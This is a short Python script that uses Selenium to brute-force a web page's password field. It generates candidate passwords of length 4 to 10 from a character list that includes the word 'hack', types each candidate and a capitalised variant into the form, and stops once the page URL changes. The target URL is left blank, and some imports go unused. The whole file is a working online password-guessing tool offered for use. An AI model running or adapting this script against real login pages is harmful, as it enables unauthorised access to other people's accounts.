import hashlib
from urllib.request import urlopen
import string
import itertools
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By

options = webdriver.ChromeOptions()
options.add_experimental_option('excludeSwitches', ['enable-logging'])
driver = webdriver.Chrome(options=options)

url = ""
driver.get(url)

characters = ["hack", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
              "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
              "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
              "!", "#", "@"]

password_field = driver.find_element(By.CLASS_NAME, "password-input")
submit = driver.find_element(By.CLASS_NAME, "arrow-icon")


def crack():
    # Number of guesses
    count = 0
    password_length = 4
    while True:

        print(password_length)
        for possible_password in itertools.product(characters, repeat=password_length):
            count += 1
            if count % 100000000 == 0:
                print(count)
            if possible_password.count("hack") == 1:
                password_field.clear()
                password_field.send_keys(possible_password)
                submit.click()
                print(possible_password)
                possible_password = list(possible_password)
                possible_password[0] = possible_password[0].capitalize()
                password_field.clear()
                password_field.send_keys(possible_password)
                submit.click()
                print(possible_password)
                if driver.current_url != url:
                    return

        if password_length == 10:
            break
        password_length += 1


if __name__ == "__main__":
    crack()
    print("________")
